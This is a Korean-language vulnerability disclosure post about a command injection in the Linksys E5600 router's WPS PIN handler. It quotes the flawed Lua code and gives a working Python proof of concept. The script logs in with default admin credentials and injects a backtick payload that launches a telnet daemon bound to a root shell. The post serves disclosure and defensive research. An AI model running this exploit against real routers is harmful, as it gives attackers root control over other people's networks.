---
title: "E5600 라우터 WPS PIN 커맨드 인젝션"
date: 2021-01-01
description: "E5600 라우터의 WPS PIN 처리 과정에서 발견된 커맨드 인젝션 취약점 — 조작된 WPS PIN 파라미터를 통한 인증된 원격 코드 실행"
tags: ["IoT", "router", "command-injection", "WPS", "embedded", "RCE"]
categories: ["Research"]
authors:
  - name: "ph4nt0m"
    link: "https://github.com/Phantomn"
    image: "https://github.com/Phantomn.png"
---

## 대상

**Linksys E5600 라우터**

| 펌웨어 버전 | 영향 여부 |
|---|---|
| 1.1.0.26 | 해당 |

## 취약점 유형

커맨드 인젝션 / 원격 코드 실행

## 개요

Linksys E5600 라우터의 WPS PIN 등록 핸들러에 커맨드 인젝션 취약점이 존재한다. 라우터 웹 인터페이스의 **Configure → Wi-Fi → Wi-Fi Protected Config** 경로에서 장치 PIN을 제출할 때, `PinCode` 파라미터가 검증 없이 `os.execute()`에 직접 전달된다. 이를 통해 인증된 공격자가 임의의 셸 명령을 삽입할 수 있다.

## 근본 원인

취약점은 `squashfs-root/usr/share/lua/runtime.lua`의 491번째 줄에 위치한다.

```lua
function runtime.wpsProcess(pt)
    local ret = '"OK"'

    print("wpsProcess")

    if pt["Mode"] == 'PBC' then
        os.execute("wps_action.sh PBC &")

    elseif pt["Mode"] == 'PIN' and pt["PinCode"] ~= nil then

[1]     cmd = 'wps_action.sh PIN '..pt["PinCode"]..' &'
[2]     os.execute(cmd)

    elseif pt["Mode"] == 'STOP' then
        print("wpsProcess STOP")

        cmd = 'ps | grep wps_action.sh | grep -v grep | awk \'{print $1}\' | xargs kill'
        os.execute(cmd)

    else
        print("wpsProcess Fail")
    end

    return ret
end
```

`[1]`에서 `pt["PinCode"]`가 아무런 검증이나 이스케이프 처리 없이 셸 명령 문자열에 직접 연결된다. `[2]`에서 결과 문자열이 `os.execute()`로 전달되어 시스템 셸을 통해 실행된다. `PinCode`를 제어할 수 있는 공격자는 백틱(`` ` ``)이나 `$()`같은 셸 메타문자를 사용해 의도된 명령 컨텍스트를 탈출할 수 있다.

## 재현 방법

```python
import requests
import json

# Step 1: 인증 후 세션 쿠키 획득
url1 = 'http://192.168.1.1/cgi-bin/login.cgi'
data1 = {
    "username": "YWRtaW4%3D",
    "password": "YWRtaW4%3D",
    "token": "",
    "source": "web",
    "cn": "",
    "action": "auth"
}
response1 = requests.post(url1, data=json.dumps(data1))

# Step 2: WPS PIN 파라미터를 통한 커맨드 인젝션
url2 = 'http://192.168.1.1/API/info'
headers2 = {
    'Host': '192.168.1.1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Content-Type': 'application/json',
    'Origin': 'http://192.168.1.1',
    'Referer': 'http://192.168.1.1/idp/idp_ping.html',
    'Cookie': response1.headers['Set-Cookie'].split(" ")[0],
}
data2 = {
    "wpsProcess": {
        "Mode": "PIN",
        "PinCode": "38316173`/usr/sbin/telnetd -l /bin/sh`"
    }
}
response2 = requests.post(url2, headers=headers2, data=json.dumps(data2))
print(response2.text)
```

삽입된 페이로드 `` `/usr/sbin/telnetd -l /bin/sh` ``는 라우터가 `/bin/sh`에 바인딩된 telnet 데몬을 실행하도록 만들며, 초기 인증 단계 이후 인증 없이 root 셸에 접근할 수 있게 된다.

장치에서 실제로 실행되는 명령:

```bash
wps_action.sh PIN 38316173`/usr/sbin/telnetd -l /bin/sh` &
```

셸은 백틱으로 감싸인 부분을 명령 치환으로 해석하여, `wps_action.sh`가 실행되기 전에 `/usr/sbin/telnetd -l /bin/sh`를 먼저 실행한다.

## 영향

성공적인 익스플로잇은 라우터에서 root 수준의 코드 실행 권한을 제공한다. 라우터의 관리자 인터페이스에 접근할 수 있는 공격자(로컬 네트워크 또는 외부에 노출된 관리 포트)는 다음과 같은 행위가 가능하다.

- 영구적인 백도어 셸 실행 (`telnetd`, `dropbear`)
- 라우팅 테이블, DNS 설정, 방화벽 규칙 변조
- 장치를 통과하는 네트워크 트래픽 도청 또는 리다이렉션
- 장치를 내부 네트워크 침투를 위한 피벗 포인트로 활용

## 발견자

CoreSecurity OT Research Team
